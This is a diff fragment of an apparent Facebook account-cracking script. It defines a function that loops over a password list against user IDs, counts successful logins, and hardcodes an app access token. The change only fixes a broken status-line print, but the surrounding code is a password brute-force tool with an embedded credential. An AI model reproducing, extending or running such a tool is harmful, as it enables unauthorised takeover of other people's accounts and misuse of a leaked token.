@@ -296,9 +296,7 @@ FJoya = random.choice(FJoya1)
 def fking1(ids,passlist):
         global loop
         global oks
-        sys.stdout.write('\r\r\033[37;41m [Abdullah 
-       
-➥paianda]\33[0;m %s|\033[1;32mOK:-%s \033[1;31m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[37;41m [Abdullah➥paianda]\33[0;m %s|\033[1;32mOK:-%s \033[1;31m'%(loop,len(oks)));sys.stdout.flush()
         try:
                 for pas in passlist:
                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
